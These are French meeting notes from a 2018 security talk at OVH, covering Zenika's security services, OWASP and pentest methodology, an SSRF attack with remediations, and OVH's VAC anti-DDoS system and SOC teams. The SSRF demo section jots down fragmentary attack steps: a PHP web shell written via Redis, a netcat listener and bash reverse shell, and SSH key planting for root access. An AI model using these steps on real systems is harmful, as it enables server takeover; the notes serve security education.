**Date de la réunion:** ‎13‎/‎12‎/‎2018 ‎09‎:‎00‎ ‎AM

**Emplacement:** OVH

**Notes:**

**Zenika:**

Zenika est une entreprise numérique qui dispose de 7 agence en France et de 2 agence à l&#39;internationale

Les expertises de l&#39;entreprise sont :

- DevOps
- IA, Machine Learning
- Big Data
- Web
- Sécurité

ZenSec est le pole dédié à la sécurité de l&#39;entreprise ce pole propose différents services:

- Audit
- IAM
- Test intrusion
- Formation
- Sécurité Applicative

**Méthode OWASP:**

**OWASP:** Open Web Application Security Project

Outils:

- ZAP
- WTE
- OWTF

OWASP à écris un guide pour tester son application web et vérifier sa sécurité ce guide est appeler le OWASP Test Guide

Il existe un Top  des failles les plus rencontrés par les pentester dans un autre guide appeler OWASP Top 10

**Le Test D&#39;intrusion :**

Le test d&#39;intrusion est un audit de sécurité technique qui consiste à :

- Détecter les failles
- L&#39;évaluation de leurs criticités
- Proposer des contre-mesures
- Tout en respectant le cadre légal et en étant maitrisé
- Et en respectant le périmètre d&#39;attaque définie

Il existe 3 paramètres lors d&#39;un test d&#39;intrusion:

Boite noires : on dispose d&#39;aucune info et accès au site cet audit dure quelques jours

Boite grise: On dispose d&#39;un compte utilisateur  cet audit dure environ 1 semaine

Boite Blanche: Accès total ce qui permet de lire le code des applis et de faire un audit en profondeur  cet audit dure + d&#39;1 semaine

À la fin de l&#39;audit on rend compte au client en lui fournissant ce qu&#39;on appel un Livrable qui contient plusieurs informations:

- Synthèse des test effectués
- Scénario dans lequel les tests ont été effectués
- Détails Technique
- Recommandations pour corriger les différentes failles

**Attaque SSRF :**

SSRF : Server Side Request Forgery

Contexte :

Une application fait une requête vers le serveur, il est possible de modifier l&#39;url pour forger des attaques.

Exploit :

- Inclusion de fichier
- Loopback scan
- Scan **interne**
- Communication avec services internes

Les remédiations à cette faille de sécurité sont :

- Liste blanche domaine DNS
- Analyse de réponses du serveur tiers
- Désactiver les schéma URL utilisé
- Authentification sur les services internes

**Démo :**

Nmap du serveur :

    Nmap -Pn -Ss -Sv -o -PL65535.max\_rtt\_timeout 30ms

    Curl -x POST

    Gopher url/xinfo



    <?php echo system ($GET['CMD&'])

    Config set db filename

    Config set idir /var/www/html

Exploit de Redis pour utiliser les services apaches

    nc -lvnp 4444

    Bash -i /demo/TCP

Crée une clé SSH -> log root

    Cd -> .SSH

    SSH Keygen

    Chmod

Gopher = Schéma d&#39;url alternatif à HTTP

**OVH :**



Sommaire:

Chiffre OVH

Anti DDOS OVH

Orga soc

Equipes pentest

Ovh à été crée en 1999 et compte aujourd&#39;hui 22 000 employé, l&#39;entreprise dispose de bureaux dans 14 pays différent dont 1 à Bordeaux

OVH c&#39;est 34Pops/16TB de bandwidth

Auparavant OVH à utilisé un anti DDOS appeler &quot;Tilera&quot; qui fonctionné en étagère

Depuis 2016 OVH à développer et conçu son propre anti DDOS appeler VAC

En cas nominal:

- Le trafic transite normalement
- Echantillonnage du trafic est effectué par le routeur

En début d&#39;attaque:

- Il y&#39;a une détection qui est faite pour éviter une saturation le système VAC se met alors en place

Attaque, Activation de VAC :

Pré-firewall (Arista) :

- Effectue un premier filtrage
- Isole le trafic et forward au firewall network
- S&#39;active automatiquement
- Non débrayable
- Filtrage de niveau 4 (couche transport du modèle OSI)
- Config par le client des protocole et des ports qu&#39;ils n&#39;utilisent pas pour faciliter le travail de VAC
- Home made via DPDK

Shield:

- Intervient dans le cas d&#39;attaque par amplification
- Décharge le cpu de la machine cible
- Contrôle de protocole

Armor:

- Solution hybride
- PDGA
- Rate limit
- Syncookie
- X86
- Filtres
- Pattern matching

Exemple: Attaque par reflexion

- Tripartite attaquante
- Peu d&#39;intérêt
- Principalement en UDP

BAF = Bandwidth Amplification Factor

En mars 2018 OVH à subi une attaque DDOS avec une force de 1.03 TB secondes l&#39;anti DDOS VAC n&#39;a eu aucun problème et est capable de tenir la charge d&#39;une attaque d&#39;environ 6TB/s

Pour les utilisateur cela représente une augmentation d&#39;1 euros sur la location de leurs machine

**Organisation :**

En interne la partie SOC est décomposé en plusieurs partie:

- Transverse
- DevOps
- Audit
- Dev opérationnel



Transverse:

- Sensibilisation à la SI
- Formation
- SIFM
- Ref techniques
- Réponses alertes

DevOps:

- Support des équipes
- Anti-phishing
- Anti-spam

Audit :

- Test d&#39;intrusion

Pour la partie Audit l&#39;intervenant nous explique que tout ce passe par test manuel même si les tests automatique permettent de dégrossir le travail il à aussi travailler sur les outils qui  sont assez connu aujoud&#39;hui comme par exemple :

- Lazagne
- Beroot
- Pupy

OVH est très friand des hunter de failles de sécurité et à mis en place un système de récompense pour inciter les personne à tenter de trouver des failles dans leurs services pour cela ils utilisent la plateforme YesWeHack

Fin de réunion

À compléter avec + d&#39;infos